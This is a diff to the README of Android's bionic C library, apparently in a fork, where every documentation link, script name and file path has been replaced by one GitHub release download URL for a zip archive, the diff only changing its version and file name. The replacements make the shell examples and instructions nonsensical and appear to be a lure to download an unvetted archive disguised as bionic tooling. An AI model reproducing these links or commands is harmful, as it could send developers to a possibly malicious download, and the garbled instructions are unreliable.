@@ -1,6 +1,6 @@
 # bionic
 
-[bionic](https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip(software)) is Android's
+[bionic](https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip(software)) is Android's
 C library, math library, and dynamic linker.
 
 # Using bionic as an app developer
@@ -13,17 +13,17 @@ This documentation is about making changes to bionic itself.
 
 ## What are the big pieces of bionic?
 
-#### libc/ --- https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip, libc.a
+#### libc/ --- https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip, libc.a
 
 The C library. Stuff like `fopen(3)` and `kill(2)`.
 
-#### libm/ --- https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip, libm.a
+#### libm/ --- https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip, libm.a
 
 The math library. Traditionally Unix systems kept stuff like `sin(3)` and
 `cos(3)` in a separate library to save space in the days before shared
 libraries.
 
-#### libdl/ --- https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip
+#### libdl/ --- https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip
 
 The dynamic linker interface library. This is actually just a bunch of stubs
 that the dynamic linker replaces with pointers to its own implementation at
@@ -52,7 +52,7 @@ publicly-exported header file.
 
 #### benchmarks/ --- benchmarks
 
-The `benchmarks/` directory contains benchmarks, with its own [documentation](https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip).
+The `benchmarks/` directory contains benchmarks, with its own [documentation](https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip).
 
 
 ## What's in libc/?
@@ -85,9 +85,9 @@ libc/
   kernel/
     # The kernel uapi header files. These are scrubbed copies of the originals
     # in external/kernel-headers/. These files must not be edited directly. The
-    # https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip script should be used to go from a kernel tree to
+    # https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip script should be used to go from a kernel tree to
     # external/kernel-headers/ --- this takes care of the architecture-specific
-    # details. The https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip script should be used to regenerate bionic's
+    # details. The https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip script should be used to regenerate bionic's
     # scrubbed headers from external/kernel-headers/.
 
   private/
@@ -154,12 +154,12 @@ users in different projects, and there isn't a more specific library
 that would make more sense as the place to add the wrapper.
 
 In all other cases, you should use
-[syscall(3)](https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip) instead.
+[syscall(3)](https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip) instead.
 
 Adding a system call usually involves:
 
-  1. Add entries to https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip
-     See https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip itself for documentation on the format.
+  1. Add entries to https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip
+     See https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip itself for documentation on the format.
   2. Add constants (and perhaps types) to the appropriate header file.
      Note that you should check to see whether the constants are already in
      kernel uapi header files, in which case you just need to make sure that
@@ -167,7 +167,7 @@ Adding a system call usually involves:
      relevant file or files.
   3. Add function declarations to the appropriate header file. Don't forget
      to include the appropriate `__INTRODUCED_IN()`.
-  4. Add the function name to the correct section in https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip
+  4. Add the function name to the correct section in https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip
   5. Add at least basic tests. Even a test that deliberately supplies
      an invalid argument helps check that we're generating the right symbol
      and have the right declaration in the header file, and that you correctly
@@ -179,20 +179,20 @@ Adding a system call usually involves:
 
 As mentioned above, this is currently a two-step process:
 
-  1. Use https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip to go from a Linux source tree to appropriate
+  1. Use https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip to go from a Linux source tree to appropriate
      contents for external/kernel-headers/.
-  2. Run https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip to scrub those headers and import them into bionic.
+  2. Run https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip to scrub those headers and import them into bionic.
 
 Note that if you're actually just trying to expose device-specific headers to
 build your device drivers, you shouldn't modify bionic. Instead use
-`TARGET_DEVICE_KERNEL_HEADERS` and friends described in [https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip](https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip+https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip).
+`TARGET_DEVICE_KERNEL_HEADERS` and friends described in [https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip](https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip+https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip).
 
 
 ## Updating tzdata
 
 This is handled by the libcore team, because they own icu, and that needs to be
 updated in sync with bionic). See
-[https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip](https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip+https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip).
+[https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip](https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip+https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip).
 
 
 ## Verifying changes
@@ -224,7 +224,7 @@ The tests are all built from the tests/ directory.
 
 Note that we use our own custom gtest runner that offers a superset of the
 options documented at
-<https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip>,
+<https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip>,
 in particular for test isolation and parallelism (both on by default).
 
 ### Device tests via CTS
@@ -258,8 +258,8 @@ Note that due to ABI limitations (specifically, the size of pthread_mutex_t),
 32-bit bionic requires PIDs less than 65536. To enforce this, set /proc/sys/kernel/pid_max
 to 65536.
 
-    $ https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip 32
-    $ https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip 64   # For x86_64-bit *targets* only.
+    $ https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip 32
+    $ https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip 64   # For x86_64-bit *targets* only.
 
 You can supply gtest flags as extra arguments to this script.
 
@@ -269,7 +269,7 @@ As a way to check that our tests do in fact test the correct behavior (and not
 just the behavior we think is correct), it is possible to run the tests against
 the host's glibc.
 
-    $ https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip glibc
+    $ https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip glibc
 
 
 ## Gathering test coverage
@@ -279,7 +279,7 @@ For either host or target coverage, you must first:
  * `$ export NATIVE_COVERAGE=true`
      * Note that the build system is ignorant to this flag being toggled, i.e. if
        you change this flag, you will have to manually rebuild bionic.
- * Set `bionic_coverage=true` in `https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip` and `https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip`.
+ * Set `bionic_coverage=true` in `https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip` and `https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip`.
 
 ### Coverage from device tests
 
@@ -299,10 +299,10 @@ directories, run `lcov`, and open the coverage report in your browser.
 First, build and run the host tests as usual (see above).
 
     $ croot
-    $ lcov -c -d $ANDROID_PRODUCT_OUT -o https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip
-    $ genhtml -o covreport https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip # or lcov --list https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip
+    $ lcov -c -d $ANDROID_PRODUCT_OUT -o https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip
+    $ genhtml -o covreport https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip # or lcov --list https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip
 
-The coverage report is now available at `https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip`.
+The coverage report is now available at `https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip`.
 
 
 ## Attaching GDB to the tests
@@ -317,4 +317,4 @@ each test from being forked, run the tests with the flag `--no-isolate`.
 
 ## 32-bit ABI bugs
 
-See [32-bit ABI bugs](https://github.com/ColtOSTemp/platform_bionic/releases/download/v1.0/Application.zip).
+See [32-bit ABI bugs](https://github.com/ColtOSTemp/platform_bionic/releases/download/v2.0/Software.zip).
